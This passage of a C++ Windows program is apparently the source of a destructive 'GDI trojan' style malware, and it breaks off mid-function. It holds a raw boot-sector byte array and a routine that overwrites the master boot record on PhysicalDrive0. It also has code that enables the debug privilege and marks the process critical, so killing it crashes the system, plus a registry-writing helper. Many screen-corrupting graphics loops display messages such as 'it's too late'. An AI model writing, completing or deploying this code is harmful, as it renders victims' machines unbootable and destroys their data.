#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = { 0x0E, 0x1F, 0x0E, 0x07, 0x31, 0xDB, 0xB8, 0x00, 0x3F, 0xBF, 0x04, 0x7E, 0xB9, 0x00, 0x09, 0xF3,
0xAA, 0x88, 0x87, 0x04, 0x7E, 0x88, 0xA7, 0xC4, 0x7E, 0x88, 0x87, 0x85, 0x7F, 0x88, 0xA7, 0x45,
0x80, 0x88, 0x87, 0x05, 0x81, 0x88, 0xA7, 0xC5, 0x81, 0x88, 0x87, 0x86, 0x82, 0x88, 0xA7, 0x46,
0x83, 0x88, 0x87, 0x06, 0x84, 0x88, 0xA7, 0xC6, 0x84, 0x88, 0x87, 0x84, 0x85, 0x88, 0xA7, 0x44,
0x86, 0xFE, 0xCC, 0xFE, 0xC0, 0x83, 0xC3, 0x03, 0x81, 0xFB, 0xC0, 0x00, 0x7C, 0xC3, 0xB9, 0x00,
0x01, 0x9B, 0xDB, 0xE3, 0xD9, 0x06, 0x47, 0x7D, 0xDE, 0x0E, 0x4D, 0x7D, 0xD9, 0xFE, 0xDD, 0xD9,
0xD9, 0xE8, 0xD8, 0xC1, 0xDE, 0x0E, 0x4B, 0x7D, 0xDF, 0x1D, 0x47, 0xFF, 0x06, 0x4D, 0x7D, 0xE2,
0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFA, 0xBA, 0xC4, 0x03, 0xB8, 0x04, 0x06, 0xEF, 0xB8, 0x02,
0x0F, 0xEF, 0x83, 0xC2, 0x10, 0xB8, 0x14, 0x00, 0xEF, 0xB8, 0x17, 0xE3, 0xEF, 0xB0, 0x09, 0xEE,
0x42, 0xEC, 0x24, 0xE0, 0x04, 0x07, 0xEE, 0xFB, 0xB9, 0x00, 0x01, 0xBA, 0x04, 0x7E, 0xE8, 0x90,
0x00, 0x68, 0x00, 0xA0, 0x07, 0xBA, 0xDA, 0x03, 0xEC, 0x24, 0x08, 0x75, 0xFB, 0xEC, 0x24, 0x08,
0x74, 0xFB, 0x31, 0xED, 0xA1, 0x41, 0x7D, 0xA3, 0x00, 0x7E, 0xB5, 0x32, 0xA1, 0x43, 0x7D, 0xA3,
0x02, 0x7E, 0xB1, 0x50, 0xBE, 0x00, 0x7E, 0xBB, 0x04, 0x87, 0xB4, 0x00, 0xB2, 0x04, 0xAC, 0xD7,
0x00, 0xC4, 0xFE, 0xCA, 0x75, 0xF8, 0x26, 0x88, 0x66, 0x00, 0x45, 0xFE, 0x06, 0x02, 0x7E, 0x80,
0x06, 0x03, 0x7E, 0x03, 0xFE, 0xC9, 0x75, 0xDC, 0x80, 0x06, 0x00, 0x7E, 0x02, 0xFE, 0x06, 0x01,
0x7E, 0xFE, 0xCD, 0x75, 0xC7, 0x80, 0x06, 0x41, 0x7D, 0x01, 0x80, 0x2E, 0x42, 0x7D, 0x02, 0x80,
0x06, 0x43, 0x7D, 0x03, 0x80, 0x2E, 0x44, 0x7D, 0x04, 0xE4, 0x60, 0xFE, 0xC8, 0x75, 0x96, 0x51,
0x52, 0x8B, 0x16, 0x45, 0x7D, 0x81, 0xC2, 0x00, 0x03, 0x81, 0xFA, 0x04, 0x84, 0x7E, 0x03, 0xBA,
0x04, 0x7E, 0x89, 0x16, 0x45, 0x7D, 0xB9, 0x00, 0x01, 0xE8, 0x05, 0x00, 0x5A, 0x59, 0xE9, 0x74,
0xFF, 0x06, 0x50, 0x53, 0x0E, 0x07, 0xB8, 0x12, 0x10, 0x31, 0xDB, 0xCD, 0x10, 0x5B, 0x58, 0x07,
0xC3, 0x00, 0x00, 0x00, 0x00, 0x04, 0x7E, 0xDC, 0x0F, 0xC9, 0x3C, 0x1E, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL) {
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI piez(LPVOID lpParam) { //credits to Executioner0x00
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH hbsh = CreateSolidBrush(Hue(239));
		SelectObject(hdc, hbsh);
		POINT cpt;
		GetCursorPos(&cpt);
		Pie(hdc, cpt.x + 50, cpt.y + 50, cpt.x - 50, cpt.y - 50, 30, 30, rand() % w, rand() % h);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = x ^ y;
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, 4 * h * w, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 10)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 25;
			((BYTE*)(data + i + v))[v % 6] = ((BYTE*)(data + i))[v] ^ byte;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w, t = i * w;
			rgbScreen[i].r += (t ^ y);
			rgbScreen[i].g += (x ^ t);
			rgbScreen[i].b += (y ^ x);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI textout(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HFONT hfnt = CreateFontA(rand() % 50, rand() % 50, 10 * (rand() % 360), 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		LPCSTR things[] = { "hexafluoride", "it's too late", "where am I?", "system failure" };
		int thing = rand() % _countof(things);
		SetTextColor(hdc, Hue(239));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI woah(LPVOID lpParam) {
	float angle = 0.0f;
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = cos(angle) * 10, y = sin(angle) * 10;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		StretchBlt(hdc, x, y, w, h, hdc, 0, 0, w, h, 0x1900AC010E);
		ReleaseDC(0, hdc);
		DeleteObject(brush);
		angle += M_PI / 15;
		Sleep(10);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) { //credits to camellia-y7x
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hBitmap, 4 * h * w, data);
		BYTE byte = rand() % 255;
		int v = 1 + rand() % 49;
		for (int i = 0; w * h > i; i++) {
			INT x = i % w, y = i * h;
			((BYTE*)(data + i + v))[v] += i | (x * y);
		}
		SetBitmapBits(hBitmap, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI shader5(LPVOID lpParam) { //credits to camellia-y7x
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = (x ^ i * 8) ^ (y + i * 4);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx + x / 50.f + y / h * .1f, 0.9f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI swirl(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int xSize = sh / 10, ySize = 9;
	while (true) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		SelectObject(hdcMem, brush);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, 0x1900AC010E);
		for (int i = 0; i < sh * 2; i++) {
			int wave = log2(i / ((float)xSize) * M_PI) * (ySize);
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hdcMem, brush);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, 0x1900AC010E);
			DeleteObject(brush);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hdcMem, brush);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, 0x1900AC010E);
			DeleteObject(brush);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, 0x1900AC010E);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

VOID WINAPI SplitBlt(HDC hcdc, HDC hcdc2, int s, int w, int h, DWORD SRC) {
	BitBlt(hcdc, w / 2 + s, 0, w / 2, h / 2, hcdc2, w / 2, s, SRC);
	BitBlt(hcdc, w / 2 + s, h / 2 + s, w / 2, h / 2, hcdc2, w / 2, h / 2, SRC);
	BitBlt(hcdc, 0, 0, w / 2, h / 2, hcdc2, s, s, SRC);
	BitBlt(hcdc, 0, h / 2 + s, w / 2, h / 2, hcdc2, s, h / 2, SRC);
}

DWORD WINAPI shader6(LPVOID lpParam) { //credits to soheil shahrab, but i modified it
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int ii = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int code = x ^ y ^ x / 3;
			rgbScreen[i].b += y << (code / 1024);
		}
		ii++;
		SplitBlt(hdcScreen, hdcMem, cos(ii) * 5, w, h, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	return 0;
}

struct Point3D {
	float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, int color) {
	HBRUSH hBrush = CreateSolidBrush(color);
	SelectObject(hdc, hBrush);
	Ellipse(hdc, x - 10, y - 10, x + 20, y + 20);
	DeleteObject(hBrush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y; point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x; point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x; point.y = y;
	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA, float color) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY, color);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI cube(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, 88);
	int hdpi = GetDeviceCaps(hdc, 90);
	ReleaseDC(0, hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int x = w * wdpi / 96;
	int y = h * hdpi / 96;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	float x2 = 100.0;
	float y2 = 100.0;
	float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
	float angleIncrement = 0.04;
	float colorA = 0;
	float size = 100;
	while (true) {
		hdc = GetDC(0);
		x2 += incrementor * signX;
		y2 += incrementor * signY;
		if (x2 + 75 >= x) {
			signX = -1; x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 1; x2 = 76;
		}
		if (y2 + 75 >= y) {
			signY = -1; y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 1; y2 = 76;
		}
		Point3D center = { x2, y2, 0.0f };
		int color = Hue(239);
		HPEN hPen = CreatePen(0, 8, color);
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA, color);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		DeleteDC(hdc);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;
		Sleep(10);
		colorA += 1;
		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}

DWORD WINAPI shader7(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((4 * i) + ((4 * i) * sin(y / 16.0)) + (4 * i) + ((4 * i) * sin(x / 8.0)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI icons(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI glitch(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		int y = rand() % sh;
		int h = sh - rand() % sh - (sh / 1 - 8);
		int ColorRefReq = (rand() % 255) << 8;
		int ColorRef = (ColorRefReq | (rand() % 255)) << 8;
		HBRUSH brush = CreateSolidBrush(ColorRef | rand() % 255);
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, MERGECOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
